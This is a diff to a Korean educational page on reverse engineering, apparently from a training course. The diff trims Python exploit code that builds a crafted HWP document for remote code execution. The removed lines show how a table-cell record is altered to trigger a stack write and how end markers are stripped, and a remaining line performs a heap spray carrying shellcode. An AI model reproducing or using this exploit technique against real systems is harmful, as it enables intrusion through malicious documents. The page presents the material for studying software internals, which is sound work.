@@ -43,7 +43,7 @@ _Windows 7, 8, 10 기준 64비트 운영체제의 32비트 어플리케이션의
 이해하는데 큰 영향을 주게 됩니다.
 
 또한 역공학을 통해서 Exploit 을 개발하기 위해서는 기본적인 프로그래밍 능력이 요구됩니다. 아래의 코드는 왼쪽 데모영상에서 사용된 RCE 를 수행하게 해주는 조작된 문서파일을
-생성하기 위한 파이썬 코드 예시를 보여줍니다. 이러한 <U>Exploit 코드개발을 통해서 소프트웨어의 내부 동작 과정 및 프로그래밍의 원리등을
+생성하기 위한 파이썬 코드의 일부분 예시를 보여줍니다. 이러한 <U>Exploit 코드개발을 통해서 소프트웨어의 내부 동작 과정 및 프로그래밍의 원리등을
 심도있게 연구 할 수 있습니다.</U> 
 
 ```python
@@ -135,81 +135,7 @@ def append_paratext(payload, end=0):
 		head = (size << 20) | (level << 10) | tag				
 		z += struct.pack('<I', head) + payload + '\x0d\x00'
 	
-	# PARACHARSHAPE
-	size = 16
-	tag = 68
-	level = 1
-	head = (size << 20) | (level << 10) | tag				
-	z += struct.pack('<I', head) + ''.join("00 00 00 00 00 00 00 00 43 00 00 00 00 00 00 00".split()).decode('hex')
-	
-	# LINESEG
-	size = 36
-	tag = 69
-	level = 1
-	head = (size << 20) | (level << 10) | tag				
-	z += struct.pack('<I', head) + ''.join("00 00 00 00 00 0c 00 00 e8 03 00 00 e8 03 00 00 52 03 00 00 58 02 00 00 00 00 00 00 18 a6 00 00 00 00 06 00".split()).decode('hex')
-	return z
-
-# change last word of tag 0x43(67) into 0x09(trigger 8 byte stack write)
-def modify_section0(dst_strm, src_strm):
-	stat = src_strm.Stat(STGC_DEFAULT)
-	s = zlib_deflate(src_strm.Read(stat[2]))
-	#print hexdump(s)	
-	# parse
-	z = ''		# modified data
-	index = 0
-	endmark = False
-	print 'processing tags...'
-	while index < len(s):				
-		head = struct.unpack('<I', s[index:index+4])[0]
-		#print "head : {}".format(hex(head))
-		size = (head & 0xfff00000) >> 20
-		level = (head & 0x000ffc00) >> 10
-		tag = (head & 0x000003ff)
-		index += 4
-		
-		# big record! [header][bigsize][payload]
-		if size == 0xFFF:
-			print 'tag {} is big!'.format(tag)
-			size = struct.unpack('<I', s[index:index+4])[0]
-			index += 4
-
-			print 'big size : ', size			
-			# check out big payload.
-			o = s[index:index+size]				
-
-			# not chaning the big size and header.			
-			z += struct.pack('<I', head) + struct.pack('<I', size) + o
-			index += size
-		# normal record!		
-		else:
-			o = s[index:index+size]
-
-			if tag == 72:		# table cell
-				# inject bug here!
-				o_pat = '410001000100'.decode('hex')
-				b_pat = '410044020100'.decode('hex')
-				if o.find( o_pat ) != -1:
-					o = o.replace(o_pat, b_pat)
-					print 'bug injected!'
-
-			# PARATEXT (to indicate the next PARAHEADER has endmarker)
-			if tag == 67:
-				# signature for "daehee"
-				if o.find('\x64\x00\x61\x00\x65\x00\x68\x00\x65\x00\x65\x00') != -1:
-					print 'next PARAHEADER is end marker...'
-					endmark = True
-				
-			# PARAHEADER (important)
-			if tag == 66 and endmark == True:				
-				if o[:4] == "\x01\x00\x00\x80":			# must remove end marker!
-					o = "\x01\x00\x00\x00" + o[4:]
-				head = (size << 20) | (level << 10) | tag
-				print 'removing current end marker...'
-
-			z += struct.pack('<I', head) + o
-			index += size			
-	#}}while
+    ...
 
 	print 'heap spray...'
 	z += append_paratext( 'A'*0x5000000 + SHELLCODE )	
